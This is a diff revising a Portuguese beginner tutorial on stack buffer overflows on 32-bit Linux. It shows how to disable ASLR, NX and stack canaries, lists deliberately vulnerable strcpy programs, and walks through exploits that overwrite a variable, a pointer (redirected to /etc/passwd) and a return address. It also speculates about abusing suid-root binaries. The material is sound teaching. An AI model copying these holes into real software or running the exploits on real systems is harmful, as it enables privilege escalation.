@@ -53,7 +53,9 @@ Buffer Overflows para Iniciantes
    -----------------------------
 
 - Apresentação
-- Oque é Buffer Overflow?
+- O que é um Buffer Overflow?
+- Ambiente
+- O binário e processo ELF
 - Desabilitando Proteções
 - Identificando a vulnerabilidade
 - Métodos de Exploração
@@ -69,34 +71,114 @@ Buffer Overflows para Iniciantes
 
       Estou aqui para demonstrar o funcionamento de buffer overflows, esta técnica muito falada, mas pouco entendida, teremos aqui uma introdução ao tema.
 
-- Oque é Buffer Overflow?
+- O que é um Buffer Overflow?
 
       Buffer overflow, traduzindo, seria transbordamento de memória, acontece quando se coloca mais dados do que a capacidade de um buffer. Isso acontece, pois o programador, não verifica a quantidade de dados que irão ser colocados dentro de uma determinada área de memória, este excesso de dados, pode levar ao corrompimento de outras áreas de memória adjacentes, levando ao programa a comportamentos inesperados, ou mesmo o travamento do programa.
 
       Um atacante pode se utilizar disso para travar a aplicação propositalmente ou mesmo tomar o controle do fluxo do programa, possibilitando ganhar privilégios no sistema, no caso de uma aplicação remota, a possibilidade de se ganhar acesso ao sistema. 
 
+- Ambiente
+
+      O ambiente que mexeremos sera o GNU/Linux de 32 bits, no meu caso um Ubuntu, mas a técnica é independente de sistema, a versão do kernel e das ferramentas utilizadas segue abaixo:
+
+-------------------------------------
+
+m0nad@m0nad-notebook:~$ cat /etc/issue.net 
+Ubuntu 11.04
+m0nad@m0nad-notebook:~$ uname -r
+2.6.38-13-generic
+m0nad@m0nad-notebook:~$ gdb --version
+GNU gdb (Ubuntu/Linaro 7.2-1ubuntu11) 7.2
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+m0nad@m0nad-notebook:~$ gcc --version
+gcc (Ubuntu/Linaro 4.5.2-8ubuntu4) 4.5.2
+Copyright (C) 2010 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+m0nad@m0nad-notebook:~$ 
+
+-------------------------------------
+
+- O binário e processo ELF
+
+      Já que estamos num ambiente GNU/Linux, temos que saber um pouco sobre o binário ELF - Executable Linked Format - para entendermos como um processo fica organizado na memória, vamos a ver:
+
+-------------------------------------
+
+    0xffffffff	     		  Endereços Altos
+    0xc0000000	:		:
+		|---------------|
+		|     stack	|
+		|---------------| <- esp
+		|	|	|
+		|	V	|
+		|		|
+		|---------------|
+    0x40000000	|  shared libs  |
+		|---------------|
+		|		|
+		|	A	|
+		|	|	|
+		|---------------| <- brk
+		|     heap	| 
+		|---------------|
+		|  .bss, .data	|
+		|---------------|
+		| .init, .text,	|
+    0x08048000	|   .rodata	|
+		|---------------| Enedereços Baixos
+    0x00000000	:		:
+
+-------------------------------------
+
+      Podemos ver como o processo fica organizado, é importante entender que a pilha(stack) cresce decrementando o registrador 'esp' - Extended Stack Pointer - ou seja, o ponteiro da pilha, que aponta sempre para o topo da mesma, a pilha cresce decrementando o 'esp', a heap cresce usando malloc(e similares) por meio da chamada de sistema(system call) 'brk' ou 'sbrk' para ajustar o seu tamanho, abaixo temos as areas 'bss' e 'data', que ficam variáveis globais e inicializadas, e mais abaixo fica o 'code segment', que contem as instruções executáveis.
+
+
 - Desabilitando Proteções
  
-      Com o advento das técnicas de exploração deste tipo de vulnerabilidade, proteções foram desenvolvidas, para que mesmo quando o programa for de fato vulnerável, o sistema não possa ser comprometido, algumas dessas proteções estão vindo por default em distros como Ubuntu e Fedora por exemplo, no caso, fiz todos os testes em Ubuntu 10.10 e para este, tive que desabilitar algumas proteções, como Adress Space Layout Randomization, chamado simplesmente de ASLR, este tipo de proteção, deixa áreas de memória, (como stack, heap, libc) com  endereços 'aleatórios', dificultando a exploração de vulnerabilidades desse tipo.
+      Com o advento das técnicas de exploração deste tipo de vulnerabilidade, proteções foram desenvolvidas, para que mesmo quando o programa for de fato vulnerável, o sistema não possa ser comprometido, algumas dessas proteções estão vindo por default em distros como Ubuntu e Fedora por exemplo, no caso, fiz todos os testes em Ubuntu 10.10 e para este, tive que desabilitar algumas proteções, como:
 
-      Outro tipo de sistema de proteção, é o Smash The Stack Protection também conhecido como ProPolice, este tipo de proteção funciona colocando-se um 'cookie', ou seja um valor, no topo do buffers, e caso este valor seja alterado, devido a um transbordamento, uma função ira verificar o valor do cookie, caso esteja diferente, o programa é finalizado.
+      Adress Space Layout Randomization, chamado simplesmente de ASLR, este tipo de proteção, deixa áreas de memória, (como stack, heap, libc) com  endereços 'aleatórios', dificultando a exploração de vulnerabilidades desse tipo.
 
-      Para desabilitar o SSP(smash the stack protection aka propolice), quando for compilar seu código vulnerável, basta acrescentar o argumento '-fno-stack-protector' no momento de compilar o seu código.
-
- ex:
--------------------------------------
-
-$ gcc vuln.c -o vuln -fno-stack-protector
-
--------------------------------------
-
-      E Para desabilitar o ASLR, basta digitar, como root:
+      Para desabilitar o ASLR, basta digitar, como root:
 
 -------------------------------------
 
 # echo 0 > /proc/sys/kernel/randomize_va_space
 
 -------------------------------------
+
+      Outra proteção é NX bit - Non eXecute bit - que impede a execução de código em areas que temos permissão de escrita, este tipo de proteção impede a exploração com o uso de shellcodes, para desabitar este tipo de proteção basta usar a opção do gcc '-z execstack'.
+
+ex:
+
+-------------------------------------
+
+$ gcc -o vuln vuln.c -z execstack
+
+-------------------------------------
+
+      Outro tipo de sistema de proteção, é o Smash The Stack Protection também conhecido como ProPolice, este tipo de proteção funciona colocando-se um 'cookie', ou seja um valor, no topo do buffers, e caso este valor seja alterado, devido a um transbordamento, uma função ira verificar o valor do cookie, caso esteja diferente, o programa é finalizado.
+
+      Para desabilitar o SSP(smash the stack protection aka propolice), quando for compilar seu código vulnerável, basta acrescentar o argumento '-fno-stack-protector' no momento de compilar o seu código.
+
+ ex:
+
+-------------------------------------
+
+$ gcc vuln.c -o vuln -fno-stack-protector
+
+-------------------------------------
+
+
 - Identificando a vulnerabilidade
    
       Como mencionei acima, a falha acontece quando o programador não verifica a quantidade de dados que serão colocados em um determinado buffer.
@@ -114,7 +196,7 @@ m0nad@m0nad-desktop:~$ cat bo_gets.c
 #include <string.h>
 
 int
-main ()
+main()
 {
 
   char buffer[4];
@@ -135,7 +217,7 @@ m0nad@m0nad-desktop:~$
 
 - Métodos de Exploração
 
-      Podemos sobrescrever outras variáveis da pilha.
+    Podemos sobrescrever outras variáveis da pilha.
 
       Por exemplo, sobrescrever uma variável, que no caso verifica se o usuário é admin e assim possivelmente ganhar privilégios.
 
@@ -146,16 +228,16 @@ m0nad@m0nad-desktop:~$ cat bo_admin.c
 #include <stdlib.h>
 #include <string.h>
 int
-main (int argc, char **argv)
+main(int argc, char ** argv)
 {
   int admin = 0;
   char user[16];
   if (argc > 1)
   {
-     strcpy (user, argv[1]);// aqui o overflow!
-     printf ("Bem vindo %s\n", user);
+     strcpy(user, argv[1]);// aqui o overflow!
+     printf("Bem vindo %s\n", user);
   }else {
-     printf ("./bo_admin usuario\n");
+     printf("./bo_admin usuario\n");
   }
   if (admin) {
      puts("HACKED!\nVoce eh admin");
@@ -169,7 +251,38 @@ m0nad@m0nad-desktop:~$
 
 -------------------------------------
 
-      Bem, nesse código não ah uma verificação para mudar o valor da variável 'admin' de '0', para algo diferente de zero, que validaria o nosso 'if', o único jeito, seria com um overflow, vamos ver.
+      Bem, nesse código não ah uma verificação para mudar o valor da variável 'admin' de '0', para algo diferente de zero, que validaria o nosso 'if', o único jeito, seria com um overflow, neste caso, as variáveis são locais da função main, logo elas são armazenados na pilha(stack), as variáveis na pilha se organizam dessa forma:
+
+-------------------------------------
+
+Endereços Altos
+		|---------------| <- ebp
+		|  0x00000000	| admin
+ Pilha Cresce	|---------------| 
+      | 	|  0x????????	| 
+      V		|  0x????????	|
+		|  0x????????	|
+		|  0x????????	| user[16]
+		|---------------| <- esp
+Endereços Baixos
+
+-------------------------------------
+
+      Os '0x??' representam os bytes que não sabemos, já que é um buffer não inicializado, e acima temos os o espaço para a variável 'admin', com o valor zero. 
+      Outra maneira de visualizar seria na horizontal:
+ 
+-------------------------------------
+
+               esp		     ebp
+		|		      |
+                v  <--- pilha cresce  V
+
+		|????????????????|0000|
+                :user[16] 	 :admin   
+
+-------------------------------------
+
+        O que faremos para conseguimos o overflow é encher o buffer 'user' para atingirmos a variável 'admin', vamos tentar: 
 
 -------------------------------------
 
@@ -183,11 +296,40 @@ m0nad@m0nad-desktop:~$
 
 -------------------------------------
 
-      Sucesso! HACKED! somos admin! :)
+      HACKED! somos admin! :)
 
       Isso acontece porque a variável 'user', sofreu um transbordamento e atingiu a variável 'admin', modicando seu conteúdo para algo diferente de '0', validando assim o nosso 'if', que verifica se somos admins.
+      Vamos ver como isso ficou:
 
-      Podemos também, sobrescrever por exemplo, um ponteiro.
+-------------------------------------
+
+		|---------------| <- ebp
+		|  0x0000005f	| admin
+		|---------------| 
+		|  0x5f5f5f5f	| 
+		|  0x5f5f5f5f	|
+		|  0x5f5f5f64	|
+		|  0x616e306d	| user[16]
+		|---------------| <- esp
+
+-------------------------------------
+
+      Podemos ver os valores em hexa da string, e como o caractere '_'  atingiu a variável 'admin', modificando assim o seu valor, vamos ver na horizontal:
+ 
+-------------------------------------
+
+               esp		     ebp
+		|		      |
+                v  <--- pilhs cresce  V
+
+		|m0nad___________|_000|
+                :user[16] 	 :admin	
+
+-------------------------------------
+
+      Acho que ficou fácil de entender o que acontece nesse overflow, vamos para outro exemplo.
+
+    Podemos também, sobrescrever por exemplo, um ponteiro.
 
       Vejamos o código:
 
@@ -199,15 +341,15 @@ m0nad@m0nad-desktop:~$ cat bo_pointer.c
 #include <string.h>
 
 int
-main (int argc, char** argv)
+main(int argc, char ** argv)
 {
-  char* arquivo = "/tmp/arquivo";
+  char * arquivo = "/tmp/arquivo";
   char buffer[4];
   if (argc > 1 ) {
   
-    printf ("Arquivo antes : %s\n", arquivo);
+    printf("Arquivo antes : %s\n", arquivo);
     strcpy(buffer, argv[1]); //aqui o overflow
-    printf ("Arquivo depois : %s\n", arquivo);
+    printf("Arquivo depois : %s\n", arquivo);
   }
 }
 m0nad@m0nad-desktop:~$ gcc -o bo_pointer bo_pointer.c -fno-stack-protector 
@@ -244,27 +386,24 @@ buffer[3] = '\0';
 
 -------------------------------------
 
-m0nad@m0nad-desktop:~$ export HACK="/etc/passwd"
-
-m0nad@m0nad-desktop:~$ ./getenv HACK
-O endereço e': 0xbffff6de
-Seu conteúdo e': /etc/passwd
-
-m0nad@m0nad-desktop:~$ ./bo_pointer AAAA`printf "\xde\xf6\xff\xbf"`
+m0nad@m0nad-notebook:~$ export HACK="/etc/passwd"
+m0nad@m0nad-notebook:~$ ./getenv HACK
+bffff62c
+m0nad@m0nad-notebook:~$ ./bo_pointer AAAA`printf "\x2c\xf6\xff\xbf"`
 Arquivo antes : /tmp/arquivo
-Arquivo depois : asswd
-
-m0nad@m0nad-desktop:~$ ./bo_pointer AAAA`printf "\xd8\xf6\xff\xbf"`
+Arquivo depois : swd
+m0nad@m0nad-notebook:~$ ./bo_pointer AAAA`printf "\x24\xf6\xff\xbf"`
 Arquivo antes : /tmp/arquivo
 Arquivo depois : /etc/passwd
+m0nad@m0nad-notebook:~$ 
 
 -------------------------------------
 
       Sucesso! Conseguimos alterar o valor da variável! para algo que queriamos.
 
-      Vejam que colocamos o endereço em 'little endian', onde o valor 0xbffff6de, ficou 'de f6 ff bf'. mas só pegou o 'asswd', isso é por causa do alinhamento da pilha, com um pequeno cálculo, colocamos o endereço certo, e conseguimos o '/etc/passwd'.
+      Vejam que colocamos o endereço em 'little endian', onde o valor 0xbffff62c, ficou '2c f6 ff bf'. mas só pegou o 'swd', isso é por causa do alinhamento da pilha, com um pequeno cálculo, colocamos o endereço certo, e conseguimos o '/etc/passwd'.
 
-      Bem se foce um suidroot, que alteraria esse arquivo temporário, baseado em algo que escrevemos, poderiamos possivelmente escrever dentro de /etc/passwd, adicionando talvez um usuário como root! abaixo o código do 'getenv':
+      Bem se fosse um suidroot, que alteraria esse arquivo temporário, baseado em algo que escrevemos, poderiamos possivelmente escrever dentro de /etc/passwd, adicionando talvez um usuário como root! abaixo o código do 'getenv':
 
 -------------------------------------
 
@@ -272,10 +411,10 @@ Arquivo depois : /etc/passwd
 #include <stdlib.h>
 
 int
-main (int argc, char **argv)
+main(int argc, char ** argv)
 {
-  char *path;
-  if (argc < 2 ) {
+  char * path;
+  if (argc < 2) {
     puts("Sem argumentos");
     exit(1);
   }
@@ -287,7 +426,7 @@ main (int argc, char **argv)
 
 -------------------------------------
 
-    Tomar o controle de fluxo da aplicação!
+    Tomar o controle do fluxo da aplicação!
 
       Podemos sobrescrever por exemplo, um ponteiro para uma função, alterando-o para o endereço de qualquer função dentro do código, ou mesmo fora dele, quando essa variável tipo ponteiro para função foce chamada, executaria oque apontarmos, no caso de um suid-root, poderíamos executar uma shell recebendo assim acesso root! Ou no caso de um servidor, nos dando acesso ao sistema.
 
@@ -298,9 +437,9 @@ main (int argc, char **argv)
 m0nad@m0nad-desktop:~$ cat > puts.c
 #include <stdio.h>
 int
-main ()
+main()
 {
-  puts ("exemplo");
+  puts("exemplo");
   return 0;
 }
 ^C
@@ -347,29 +486,42 @@ m0nad@m0nad-desktop:~$ cat bo_hack.c
 #include <string.h>
 #include <stdlib.h>
 void
-hack ()
+hack()
 {
-  printf ("Hacking!\n");
-  exit (0);
+  printf("Hacking!\n");
+  exit(0);
 }
 int
-main (int argc, char** argv)
+main(int argc, char ** argv)
 {
   char bug[4];
   if (argc > 1) {
-    printf ("Endereco de hack : %p\n", hack);
+    printf("Endereco de hack : %p\n", hack);
     strcpy(bug, argv[1]); //aqui o overflow
   }
-
   return 0;
 }
+-------------------------------------
+
+      Não chamamos em nenhum momento a função hack(), vamos tentar dar um overflow e sobrescrever o endereço de retorno salvo na pilha, para depois jogar o eip para a função hack e executa-la!
+
+-------------------------------------
+
 m0nad@m0nad-desktop:~$ gcc -o bo_hack bo_hack.c -fno-stack-protector
 m0nad@m0nad-desktop:~$ ./bo_hack AAAA
 Endereco de hack : 0x8048484
 m0nad@m0nad-desktop:~$ ./bo_hack AAAAAAAAAAAAAAAA
 Endereco de hack : 0x8048484
 Falha de segmentação
-m0nad@m0nad-desktop:~$ gdb bo_hack
+m0nad@m0nad-desktop:~$
+
+-------------------------------------
+
+      Conseguimos um crash, vamos ver no gdb.
+
+-------------------------------------
+
+m0nad@m0nad-desktop:~$ gdb bo_hack 
 GNU gdb (GDB) 7.1-ubuntu
 Copyright (C) 2010 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -414,7 +566,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 -------------------------------------
 
-      Pois sobrescrevemos o endereço de retorno, salvo na pilha, e este valor, é copiado para o contador de instruções (instruction pointer[eip]), jogando o eip para '0x41414141' ou seja, o programa tenta pular pra esse endereço de memória, que nada mais são do que o valor em hexadecimal em ASCII do caractere 'A', como esta área de memória não possui um código valido ou permissão de execução, o programa 'crasha', agora você já sabe o porquê :).
+      Pois sobrescrevemos o endereço de retorno salvo na pilha, e este valor é copiado para o contador de instruções (instruction pointer - eip), jogando o eip para '0x41414141' ou seja, o programa tenta pular pra esse endereço de memória, que nada mais são do que o valor em hexadecimal em ASCII do caractere 'A', como esta área de memória não possui um código valido ou permissão de execução, o programa 'crasha', agora você já sabe o porquê :).
 
       Caso colocarmos o endereço da função 'hack' no exato lugar do de onde esta o '0x41414141', podemos executa-la!
 
@@ -440,7 +592,7 @@ m0nad@m0nad-desktop:~$
 
       Sucesso! com isso podemos setar o nosso endereço de retorno para qualquer lugar que quisermos! E assim tomar o controle da aplicação!
 
-      Poderíamos setar o endereço para um código valido, feito por nós, chamado de shellcode ou payload, ou para um endereço da libc, com a função system, e assim executar comandos na maquina, essa técnica é chamada de return to libc, ou seja, retornar para a libC, essa técnica eu descrevo em um artigo meu Retornando para libC (https://raw.github.com/m0nad/Papers/master/ret2libc.txt)
+      Poderíamos setar o endereço para um código valido, feito por nós, chamado de shellcode ou payload, ou para um endereço da libc, como a função system, e assim executar comandos na maquina, essa técnica é chamada de return to libc, ou seja, retornar para a libc, essa técnica eu descrevo em um artigo meu Retornando para libC (https://raw.github.com/m0nad/Papers/master/ret2libc.txt), dando bypass no NX-Bit, outra técnica seria Return-Oriented Programming, que retornaria para gadgets, pequenas instruções no binário seguidas da instrução 'ret', estes gadgets encadeados formam o código a ser executado, mas esta é outra estoria :) 
 
 - Conclusão 
 
